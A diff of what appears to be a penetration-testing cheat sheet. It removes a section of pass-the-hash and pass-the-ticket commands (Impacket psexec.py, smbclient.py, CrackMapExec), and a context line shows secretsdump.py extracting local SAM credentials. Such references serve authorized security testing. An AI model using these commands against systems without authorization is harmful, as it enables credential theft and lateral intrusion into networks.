@@ -599,36 +599,6 @@ secretsdump.py LOCAL -sam sam.save -system system.save -security security.save
 
 ---
 
-## Lateral Movement
-
-### Pass the Hash
-
-Authenticate using NTLM hash instead of password:
-
-**Impacket:**
-```shell
-psexec.py -hashes :NTLM_HASH username@$RHOST
-smbclient.py -hashes :NTLM_HASH username@$RHOST
-```
-
-\
-**CrackMapExec:**
-```shell
-crackmapexec smb $RHOST -u username -H NTLM_HASH
-```
-
-### Pass the Ticket
-
-Use Kerberos tickets for authentication:
-
-**Impacket:**
-```shell
-export KRB5CCNAME=username.ccache
-psexec.py -k -no-pass username@$RHOST
-```
-
----
-
 ## Data Exfiltration
 
 ### Exfiltrate Files
